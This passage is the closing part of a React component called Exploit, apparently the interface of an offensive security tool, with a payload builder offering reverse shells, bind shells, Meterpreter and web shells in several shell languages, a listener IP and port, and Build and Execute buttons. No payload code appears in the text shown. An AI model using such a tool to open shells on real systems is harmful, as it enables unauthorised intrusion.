                                onChange={(e) => setPayloadType(e.target.value as any)}
                                className="w-full bg-cyber-darker border border-cyber-gray rounded px-2 py-1.5 text-white text-sm focus:border-cyber-green outline-none"
                              >
                                <option value="reverse_shell">Reverse Shell</option>
                                <option value="bind_shell">Bind Shell</option>
                                <option value="meterpreter">Meterpreter</option>
                                <option value="web_shell">Web Shell</option>
                                <option value="custom">Custom</option>
                              </select>

                              {payloadType === 'reverse_shell' && (
                                <select
                                  value={payloadVariant}
                                  onChange={(e) => setPayloadVariant(e.target.value as any)}
                                  className="w-full bg-cyber-darker border border-cyber-gray rounded px-2 py-1.5 text-white text-sm focus:border-cyber-green outline-none"
                                >
                                  <option value="bash">Bash</option>
                                  <option value="python">Python</option>
                                  <option value="perl">Perl</option>
                                  <option value="netcat">Netcat</option>
                                  <option value="powershell">PowerShell</option>
                                </select>
                              )}

                              <div className="grid grid-cols-2 gap-2">
                                <input
                                  type="text"
                                  value={listenerIP}
                                  onChange={(e) => setListenerIP(e.target.value)}
                                  className="w-full bg-cyber-darker border border-cyber-gray rounded px-2 py-1.5 text-white text-sm font-mono focus:border-cyber-green outline-none"
                                  placeholder="Listener IP"
                                />
                                <input
                                  type="text"
                                  value={listenerPort}
                                  onChange={(e) => setListenerPort(e.target.value)}
                                  className="w-full bg-cyber-darker border border-cyber-gray rounded px-2 py-1.5 text-white text-sm font-mono focus:border-cyber-green outline-none"
                                  placeholder="Port"
                                />
                              </div>

                              {payloadType === 'custom' && (
                                <textarea
                                  value={customPayload}
                                  onChange={(e) => setCustomPayload(e.target.value)}
                                  className="w-full bg-cyber-darker border border-cyber-gray rounded px-2 py-1.5 text-white text-sm font-mono focus:border-cyber-green outline-none"
                                  rows={4}
                                  placeholder="Custom payload..."
                                />
                              )}

                              <div className="bg-cyber-darker border border-cyber-blue rounded p-2">
                                <pre className="text-cyber-green text-xs font-mono whitespace-pre-wrap break-all max-h-32 overflow-auto">
                                  {generatePayload() || 'Configure settings...'}
                                </pre>
                              </div>
                            </div>
                          </div>
                        </>
                      );
                    }
                  })()}

                  {/* Action Buttons */}
                  <div className="flex space-x-2">
                    <button
                      onClick={handleBuildExploit}
                      className="flex-1 btn-cyber border-cyber-purple text-cyber-purple hover:bg-cyber-purple hover:text-black py-2 text-sm font-bold"
                    >
                      â—ˆ Build
                    </button>
                    <button
                      onClick={() => {
                        handleExecutePayload();
                        setShowBuilderPanel(false);
                        setActiveTab('console');
                      }}
                      className="flex-1 btn-cyber border-cyber-red text-cyber-red hover:bg-cyber-red hover:text-black py-2 text-sm font-bold"
                    >
                      â—† Execute
                    </button>
                  </div>
                </div>
              )}
            </div>
          </div>
        </>
      )}
    </div>
  );
};

export default Exploit;
